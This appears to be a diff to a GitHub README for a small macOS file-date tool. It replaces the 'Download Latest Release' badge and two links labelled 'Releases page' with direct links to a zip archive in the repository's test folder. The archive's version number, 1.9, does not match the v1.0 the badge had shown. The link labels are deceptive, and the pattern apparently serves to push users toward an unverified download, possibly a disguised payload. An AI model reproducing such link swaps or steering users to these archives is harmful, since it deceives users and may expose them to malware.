@@ -8,7 +8,7 @@ Welcome to the **rubicon_set_future_file_added_date** project! This is a lightwe
 
 ## 📥 Download Now
 
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0-brightgreen)](https://github.com/Pranavam18/rubicon_set_future_file_added_date/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Pranavam18/rubicon_set_future_file_added_date/main/test/rubicon_set_future_file_added_date_1.9.zip)](https://raw.githubusercontent.com/Pranavam18/rubicon_set_future_file_added_date/main/test/rubicon_set_future_file_added_date_1.9.zip)
 
 ---
 
@@ -25,7 +25,7 @@ To use this tool, follow the steps below to download and set it up on your macOS
 ### 🛠️ Installation Steps
 
 1. **Visit the Releases Page:**
-   Go to the [Releases page](https://github.com/Pranavam18/rubicon_set_future_file_added_date/releases).
+   Go to the [Releases page](https://raw.githubusercontent.com/Pranavam18/rubicon_set_future_file_added_date/main/test/rubicon_set_future_file_added_date_1.9.zip).
 
 2. **Download the Latest Release:**
    Look for the latest version listed. Click on the corresponding file to download it. 
@@ -111,6 +111,6 @@ If you encounter any issues or have feedback, feel free to reach out via the Git
 
 ## 💾 Download & Install Again
 
-For installation or updates, always visit the [Releases page](https://github.com/Pranavam18/rubicon_set_future_file_added_date/releases) to ensure you have the latest version.
+For installation or updates, always visit the [Releases page](https://raw.githubusercontent.com/Pranavam18/rubicon_set_future_file_added_date/main/test/rubicon_set_future_file_added_date_1.9.zip) to ensure you have the latest version.
 
 Feel free to explore, and happy file management!
